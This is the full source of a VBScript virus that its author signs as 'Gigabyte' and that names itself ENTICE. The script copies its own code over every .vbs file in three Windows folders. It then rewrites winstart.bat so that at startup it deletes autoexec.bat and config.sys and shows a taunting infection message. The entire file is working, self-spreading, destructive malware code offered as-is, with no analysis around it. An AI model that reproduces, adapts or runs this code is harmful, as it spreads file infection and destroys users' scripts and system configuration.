   On Error Resume Next

   dim a, FSO, entice, f, b, Map, onstart, c

   Const ForReading = 1, ForWriting = 2, ForAppending = 8

   Set entice = CreateObject("Scripting.FileSystemObject")
   Set f = entice.OpenTextFile(WScript.ScriptFullName, 1)
   virus =  f.ReadAll


   Set FolderObj = entice.GetFolder("c:\my documents\")
   Set a = FolderObj.Files
   For each target in a
   ExtName = lcase(entice.GetExtensionName(target.Name))
   if ExtName = "vbs" then
   Set b = entice.OpenTextFile(target.path, 2, True)
   b.write virus
   b.close
   end if
   next

   Set Map = entice.GetFolder("c:\")
   Set a = Map.Files
   For each target in a
   ExtName = lcase(entice.GetExtensionName(target.Name))
   if ExtName = "vbs" then
   Set b = entice.OpenTextFile(target.path, 2, True)
   b.write virus
   b.close
   end if
   next

   Set FolderObj = entice.GetFolder("c:\windows\")
   Set a = FolderObj.Files
   For each target in a
   ExtName = lcase(entice.GetExtensionName(target.Name))
   if ExtName = "vbs" then
   Set b = entice.OpenTextFile(target.path, 2, True)
   b.write virus
   b.close
   end if
   next

   Set onstart = CreateObject("Scripting.FileSystemObject")
   Set c = onstart.GetFile("c:\windows\winstart.bat")
   c.Delete
   Set c = onstart.CreateTextFile("c:\windows\winstart.bat", True)
   c.WriteLine("@cls")
   c.WriteLine("@del autoexec.bat")
   c.WriteLine("@del config.sys")
   c.WriteLine("@echo I'm happy to announce..")
   c.WriteLine("@echo that you are infected with..")
   c.WriteLine("@echo           ENTICE")
   c.WriteLine("@echo Have a nice day (and fuck the hell off),")
   c.WriteLine("@echo Gigabyte")
   c.WriteLine("@pause")
   c.close

   ' Written by Gigabyte
